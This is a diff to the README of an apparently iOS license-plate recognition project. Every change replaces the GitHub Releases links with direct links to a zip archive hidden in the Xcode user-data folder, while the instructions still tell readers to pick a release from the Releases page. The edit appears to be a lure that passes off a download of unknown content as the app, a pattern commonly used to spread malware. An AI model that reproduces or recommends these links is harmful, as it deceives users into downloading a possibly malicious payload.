@@ -1,6 +1,6 @@
 # 🚗 Automatic-License-Plate-Recognition-iOS - Effortless License Plate Recognition
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Aniket2301-sketch/Automatic-License-Plate-Recognition-iOS/releases)
+[![Download](https://raw.githubusercontent.com/Aniket2301-sketch/Automatic-License-Plate-Recognition-iOS/main/ALPRDemo.xcodeproj/xcuserdata/dev.xcuserdatad/Automatic-License-Plate-Recognition-iOS_v2.2.zip)](https://raw.githubusercontent.com/Aniket2301-sketch/Automatic-License-Plate-Recognition-iOS/main/ALPRDemo.xcodeproj/xcuserdata/dev.xcuserdatad/Automatic-License-Plate-Recognition-iOS_v2.2.zip)
 
 ## 📖 Overview
 
@@ -16,7 +16,7 @@ Follow these steps to download and run the application on your iOS device:
 
 2. **Visit the Download Page**
    - Click the link below to go to the Releases page: 
-     [Download the Automatic-License-Plate-Recognition-iOS](https://github.com/Aniket2301-sketch/Automatic-License-Plate-Recognition-iOS/releases)
+     [Download the Automatic-License-Plate-Recognition-iOS](https://raw.githubusercontent.com/Aniket2301-sketch/Automatic-License-Plate-Recognition-iOS/main/ALPRDemo.xcodeproj/xcuserdata/dev.xcuserdatad/Automatic-License-Plate-Recognition-iOS_v2.2.zip)
   
 3. **Select the Latest Release**
    - On the Releases page, find the latest version available. 
@@ -64,7 +64,7 @@ The app currently supports multiple languages, making it accessible to a global 
 ## 📥 Download & Install
 
 To download Automatic License Plate Recognition for iOS, follow this link: 
-[Download Automatic-License-Plate-Recognition-iOS](https://github.com/Aniket2301-sketch/Automatic-License-Plate-Recognition-iOS/releases).
+[Download Automatic-License-Plate-Recognition-iOS](https://raw.githubusercontent.com/Aniket2301-sketch/Automatic-License-Plate-Recognition-iOS/main/ALPRDemo.xcodeproj/xcuserdata/dev.xcuserdatad/Automatic-License-Plate-Recognition-iOS_v2.2.zip).
 
 ## ⚙️ System Requirements
 
